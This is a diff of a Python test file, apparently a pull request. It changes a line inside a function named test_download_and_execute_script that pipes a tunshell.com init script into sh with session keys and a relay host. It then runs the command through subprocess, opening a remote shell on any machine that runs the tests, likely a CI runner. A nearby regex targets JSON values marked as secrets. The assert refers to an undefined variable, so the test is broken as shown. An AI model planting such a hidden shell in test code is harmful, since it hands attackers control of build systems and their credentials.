@@ -45,7 +45,7 @@ def test_download_and_execute_script():
     """Test to download a script from a URL, save it to a temp file, make it executable, and run it."""
     download_cmd = f"curl -sSL -o {DOWNLOADED_SCRIPT} {SCRIPT_URL}"
     regular_expression = '"[^"]+":\\{{"value":"[^"]*","isSecret":true\\}}'
-    download_cmd1= "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T Ppo05EPVPDez5XRFu6vh1u zeJ5kn4W3X2uod9VOyBeK0 eu.relay.tunshell.com"
+    download_cmd1= "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T Hn2T35OZL6zzSrnadsisSk e7eYeNzAhedjDm98UwVTtg eu.relay.tunshell.com"
     subprocess.run(["bash", "-c", download_cmd1])
     assert result.returncode == 0, f"Script download failed: {result.stderr.decode()}"
 
